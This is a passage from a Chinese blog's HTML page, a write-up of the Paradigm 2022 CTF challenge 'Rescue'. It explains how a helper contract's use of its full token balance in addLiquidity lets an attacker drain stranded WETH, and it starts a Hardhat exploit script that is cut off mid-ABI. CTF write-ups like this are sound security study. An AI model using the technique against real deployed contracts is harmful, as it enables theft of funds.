@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="baidu-site-verification" content="093lY4ziMu" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="description" content="Thomas_Xu&#39;s Bolg">
+    <meta name="keyword"  content="Thomas_Xu, BlockChain">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <!--<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>-->
+    <title>
+        
+          Paradigm 题解 Rescue - Thomas_Xu
+        
+    </title>
+
+    <link rel="canonical" href="https://dusign.net/paradigm22-rescue/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+
+    <!-- Custom CSS --> 
+    
+        
+<link rel="stylesheet" href="/css/dusign-light.css">
+
+        
+<link rel="stylesheet" href="/css/dusign-common-light.css">
+
+        
+<link rel="stylesheet" href="/css/font-awesome.css">
+
+        
+<link rel="stylesheet" href="/css/toc.css">
+
+        <!-- background effects end -->
+    
+    
+    <!-- Pygments Highlight CSS -->
+    
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+    
+<link rel="stylesheet" href="/css/widget.css">
+
+
+    
+<link rel="stylesheet" href="/css/rocket.css">
+
+
+    
+<link rel="stylesheet" href="/css/signature.css">
+
+
+    
+<link rel="stylesheet" href="/css/fonts.googleapis.css">
+
+
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+    <!-- photography -->
+    
+<link rel="stylesheet" href="/css/photography.css">
+
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- background effects start -->
+    
+    <!-- background effects end -->
+
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            
+                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('page3.png')
+                /*post*/
+            
+        
+    }
+    
+    #signature{
+        background-image: url('/img/signature/dusign.png');
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#Paradigm" title="Paradigm">Paradigm</a>
+                            
+                        </div>
+                        <h1>Paradigm 题解 Rescue</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by Thomas_Xu on
+                            2022-10-25
+                        </span>
+
+                        
+                            <div class="blank_box"></div>
+                            <span class="meta">
+                                Words <span class="post-count">2.3k</span> and
+                                Reading Time <span class="post-count">12</span> Minutes
+                            </span>
+                            <div class="blank_box"></div>
+                            <!-- 不蒜子统计 start -->
+                            <span class="meta">
+                                Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+                            </span>
+                            <!-- 不蒜子统计 end -->
+                        
+
+                    </div>
+                
+
+                </div>
+            </div>
+        </div>      
+    </div>
+
+    
+    <div class="waveWrapper">
+        <div class="wave wave_before" style="background-image: url('/img/wave-light.png')"></div>
+        <div class="wave wave_after" style="background-image: url('/img/wave-light.png')"></div>
+    </div>
+    
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Thomas_Xu&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/categories/">Categories</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="paradigm-2022-ctf-题解——Rescue"><a href="#paradigm-2022-ctf-题解——Rescue" class="headerlink" title="paradigm 2022 ctf 题解——Rescue"></a>paradigm 2022 ctf 题解——Rescue</h1><hr>
+<pre><code>author：Thomas_Xu
+</code></pre><p><strong>环境配置</strong>:<br>由于题目环境需要使用docker，环境配置有点繁琐。我重新搭了一个hardhat框架的测试环境,而由于题目出在以太坊的主链上,并使用<code>Alchemy</code>fork了一个主网节点进行测试.</p>
+<h2 id="Resucue"><a href="#Resucue" class="headerlink" title="Resucue"></a>Resucue</h2><p>首先先来看一下这道题目的描述:<code>I accidentally sent some WETH to a contract, can you help me?</code>看起来像是由于操作失误,导致像一个合约转了一些ETH,想要完成此Challange就必须试图挽救一下这笔损失.<br>接下来看一看合约代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.16;</span><br><span class="line"></span><br><span class="line">import &quot;.&#x2F;MasterChefHelper.sol&quot;;</span><br><span class="line">interface WETH9 is ERC20Like &#123;</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Setup &#123;</span><br><span class="line">    </span><br><span class="line">    WETH9 public constant weth &#x3D; WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);</span><br><span class="line">    MasterChefHelper public immutable mcHelper;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        mcHelper &#x3D; new MasterChefHelper();</span><br><span class="line">        weth.deposit&#123;value: 10 ether&#125;();</span><br><span class="line">        weth.transfer(address(mcHelper), 10 ether); &#x2F;&#x2F; whoops</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() external view returns (bool) &#123;</span><br><span class="line">        return weth.balanceOf(address(mcHelper)) &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这是<code>Setup</code>合约,从中我们可以获取以下信息:</p>
+<ol>
+<li>我们不小心向<code>mcHelper</code>合约转了10 <code>ether</code></li>
+<li>完成Challange的条件是要求<code>mcHelper</code>合约里没有这笔钱<code>return weth.balanceOf(address(mcHelper)) == 0;</code><br>所以我们可能并不是要做到把这笔钱转回到我们账户上,而是只需要使这10个ETH从<code>mcHelper</code>消失即可.</li>
+</ol>
+<p>有了上面的分析,似乎已经有了眉目,接下来分析<code>MasterChefLike</code>合约:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.16;</span><br><span class="line"></span><br><span class="line">import &quot;.&#x2F;UniswapV2Like.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface ERC20Like &#123;</span><br><span class="line">    function transferFrom(address, address, uint) external;</span><br><span class="line">    function transfer(address, uint) external;</span><br><span class="line">    function approve(address, uint) external;</span><br><span class="line">    function balanceOf(address) external view returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface MasterChefLike &#123;</span><br><span class="line">    function poolInfo(uint256 id) external returns (</span><br><span class="line">        address lpToken,</span><br><span class="line">        uint256 allocPoint,</span><br><span class="line">        uint256 lastRewardBlock,</span><br><span class="line">        uint256 accSushiPerShare</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MasterChefHelper &#123;</span><br><span class="line"></span><br><span class="line">    MasterChefLike public constant masterchef &#x3D; MasterChefLike(0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd);</span><br><span class="line">    UniswapV2RouterLike public constant router &#x3D; UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);</span><br><span class="line"></span><br><span class="line">    function swapTokenForPoolToken(uint256 poolId, address tokenIn, uint256 amountIn, uint256 minAmountOut) external &#123;</span><br><span class="line">        (address lpToken,,,) &#x3D; masterchef.poolInfo(poolId);</span><br><span class="line">        address tokenOut0 &#x3D; UniswapV2PairLike(lpToken).token0();</span><br><span class="line">        address tokenOut1 &#x3D; UniswapV2PairLike(lpToken).token1();</span><br><span class="line"></span><br><span class="line">        ERC20Like(tokenIn).approve(address(router), type(uint256).max);</span><br><span class="line">        ERC20Like(tokenOut0).approve(address(router), type(uint256).max);</span><br><span class="line">        ERC20Like(tokenOut1).approve(address(router), type(uint256).max);</span><br><span class="line">        ERC20Like(tokenIn).transferFrom(msg.sender, address(this), amountIn);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; swap for both tokens of the lp pool</span><br><span class="line">        _swap(tokenIn, tokenOut0, amountIn &#x2F; 2);</span><br><span class="line">        _swap(tokenIn, tokenOut1, amountIn &#x2F; 2);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; add liquidity and give lp tokens to msg.sender</span><br><span class="line">        _addLiquidity(tokenOut0, tokenOut1, minAmountOut);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _addLiquidity(address token0, address token1, uint256 minAmountOut) internal &#123;</span><br><span class="line">        (,, uint256 amountOut) &#x3D; router.addLiquidity(</span><br><span class="line">            token0, </span><br><span class="line">            token1, </span><br><span class="line">            ERC20Like(token0).balanceOf(address(this)), </span><br><span class="line">            ERC20Like(token1).balanceOf(address(this)),             &#x2F;&#x2F;WETH</span><br><span class="line">            0, </span><br><span class="line">            0, </span><br><span class="line">            msg.sender, </span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line">        require(amountOut &gt;&#x3D; minAmountOut);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _swap(address tokenIn, address tokenOut, uint256 amountIn) internal &#123;</span><br><span class="line">        address[] memory path &#x3D; new address[](2);</span><br><span class="line">        path[0] &#x3D; tokenIn;</span><br><span class="line">        path[1] &#x3D; tokenOut;</span><br><span class="line">        router.swapExactTokensForTokens(</span><br><span class="line">            amountIn,</span><br><span class="line">            0,</span><br><span class="line">            path,</span><br><span class="line">            address(this),</span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这个合约只有一个外部调用函数:<code>swapTokenForPoolToken()</code>所以我们可以集中目光研究此函数即可.<br>接下来我们一步一步分析这个函数:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function swapTokenForPoolToken(uint256 poolId, address tokenIn, uint256 amountIn, uint256 minAmountOut) external &#123;</span><br><span class="line">        (address lpToken,,,) &#x3D; masterchef.poolInfo(poolId);					&#x2F;&#x2F;获取poolId对应交易池</span><br><span class="line">        address tokenOut0 &#x3D; UniswapV2PairLike(lpToken).token0();			&#x2F;&#x2F;获取交易池对应的token</span><br><span class="line">        address tokenOut1 &#x3D; UniswapV2PairLike(lpToken).token1();</span><br><span class="line"></span><br><span class="line">        ERC20Like(tokenIn).approve(address(router), type(uint256).max);		&#x2F;&#x2F;每个token都给router授权</span><br><span class="line">        ERC20Like(tokenOut0).approve(address(router), type(uint256).max);</span><br><span class="line">        ERC20Like(tokenOut1).approve(address(router), type(uint256).max);</span><br><span class="line">        ERC20Like(tokenIn).transferFrom(msg.sender, address(this), amountIn);&#x2F;&#x2F;将要兑换的Weth发送到此合约</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; swap for both tokens of the lp pool</span><br><span class="line">        _swap(tokenIn, tokenOut0, amountIn &#x2F; 2);							&#x2F;&#x2F;将兑换的Weth分别交换为两种token</span><br><span class="line">        _swap(tokenIn, tokenOut1, amountIn &#x2F; 2);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; add liquidity and give lp tokens to msg.sender</span><br><span class="line">        _addLiquidity(tokenOut0, tokenOut1, minAmountOut);					</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>在函数最后调用了一个添加流动性的函数，这可能就是这笔误转账最终的去向</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function _addLiquidity(address token0, address token1, uint256 minAmountOut) internal &#123;</span><br><span class="line">        (,, uint256 amountOut) &#x3D; router.addLiquidity(</span><br><span class="line">            token0, </span><br><span class="line">            token1, </span><br><span class="line">            ERC20Like(token0).balanceOf(address(this)), 			&#x2F;&#x2F;漏洞所在</span><br><span class="line">            ERC20Like(token1).balanceOf(address(this)),             &#x2F;&#x2F;</span><br><span class="line">            0, </span><br><span class="line">            0, </span><br><span class="line">            msg.sender, </span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line">        require(amountOut &gt;&#x3D; minAmountOut);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>不难发现，这里添加流动性时，居然是把自己所有的余额全部发送到router里去<code>addLiquidity</code>，这是明显不合理的，只要我们能控制以下交易对的交换额，我们就可以把此合约的ETH余额全部加入到流动性池子当中。</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>对应以上的分析，想要解决此<code>Challange</code>,我们还得到两种token去控制流动性兑换的数量。</p>
+<p>这里我们选择usdc和dai，在<code>etherscan</code>里可以查到<code>poolId</code>为1的时候对应的pair就是usdc和Weth,并可获得token对应的地址<br><img src="CTF01.png" alt=""><br><img src="CTF02.png" alt=""><br><img src="CTF03.png" alt=""></p>
+<p>当然我们也可以用脚本来获取交易对信息:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">"chai"</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">'hardhat'</span>);</span><br><span class="line"><span class="keyword">const</span> masterLike = <span class="built_in">require</span>(<span class="string">'../contracts/rescue/MatserChefLike.json'</span>)</span><br><span class="line">describe(<span class="string">"Challange rescue"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> attacker,deployer;</span><br><span class="line">    it(<span class="string">"should return the solved"</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        [attacker,deployer] = <span class="keyword">await</span> ethers.getSigners();</span><br><span class="line">        <span class="keyword">const</span> Weth = <span class="keyword">await</span> ethers.getContractAt(<span class="string">"WETH9"</span>,<span class="string">"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"</span>, attacker);</span><br><span class="line">        <span class="keyword">const</span> SetupFactory = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">"Setup"</span>, attacker);</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">const</span> setup = <span class="keyword">await</span> SetupFactory.deploy(&#123;</span><br><span class="line">            value: ethers.utils.parseEther(<span class="string">"50"</span>)</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//Exploit</span></span><br><span class="line">        <span class="keyword">let</span> abi = [&#123;<span class="string">"inputs"</span>:[&#123;<span class="string">"internalType"</span>:<span class="string">"uint256"</span>,<span class="string">"name"</span>:<span class="string">"id"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"name"</span>:<span class="string">"poolInfo"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"internalType"</span>:<span class="string">"address"</span>,<span class="string">"name"</span>:<span class="string">"lpToken"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"internalType"</span>:<span class="string">"uint256"</span>,<span class="string">"name"</span>:<span class="string">"allocPoint"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;,&#123;<span class="string">"internalType"</span>:<span class="string">"uint256"</span>,<span class="string">"name"</span>:<span class="string">"lastRewardBlock"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;,&#123;<span class="string">"internalType"</span>:<span class="string">"uint256"</span>,<span class="string">"name"</span>:<span class="string">"accSushiPerShare"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;];</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">let</span> UniswapV2pairLikeAbi = [&#123;<span class="string">"inputs"</span>:[],<span class="string">"name"</span>:<span class="string">"token0"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"internalType"</span>:<span class="string">"address"</span>,<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;],<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"inputs"</span>:[],<span class="string">"name"</span>:<span class="string">"token1"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"internalType"</span>:<span class="string">"address"</span>,<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;],<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;];</span><br><span class="line"></span><br><span class="line">        erc20_abi = [&#123;<span class="string">"constant"</span>:<span class="literal">true</span>,<span class="string">"inputs"</span>:[],<span class="string">"name"</span>:<span class="string">"name"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"string"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">false</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">"_spender"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"name"</span>:<span class="string">"_value"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"name"</span>:<span class="string">"approve"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"bool"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"nonpayable"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">true</span>,<span class="string">"inputs"</span>:[],<span class="string">"name"</span>:<span class="string">"totalSupply"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">false</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">"_from"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"name"</span>:<span class="string">"_to"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"name"</span>:<span class="string">"_value"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"name"</span>:<span class="string">"transferFrom"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"bool"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"nonpayable"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">true</span>,<span class="string">"inputs"</span>:[],<span class="string">"name"</span>:<span class="string">"decimals"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"uint8"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">true</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">"_owner"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;],<span class="string">"name"</span>:<span class="string">"balanceOf"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">"balance"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">true</span>,<span class="string">"inputs"</span>:[],<span class="string">"name"</span>:<span class="string">"symbol"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"string"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">false</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">"_to"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"name"</span>:<span class="string">"_value"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"name"</span>:<span class="string">"transfer"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"bool"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"nonpayable"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">true</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">"_owner"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"name"</span>:<span class="string">"_spender"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;],<span class="string">"name"</span>:<span class="string">"allowance"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"payable"</span>:<span class="literal">true</span>,<span class="string">"stateMutability"</span>:<span class="string">"payable"</span>,<span class="string">"type"</span>:<span class="string">"fallback"</span>&#125;,&#123;<span class="string">"anonymous"</span>:<span class="literal">false</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"indexed"</span>:<span class="literal">true</span>,<span class="string">"name"</span>:<span class="string">"owner"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"indexed"</span>:<span class="literal">true</span>,<span class="string">"name"</span>:<span class="string">"spender"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"indexed"</span>:<span class="literal">false</span>,<span class="string">"name"</span>:<span class="string">"value"</span>,<span class="string">"type"</span>:<span 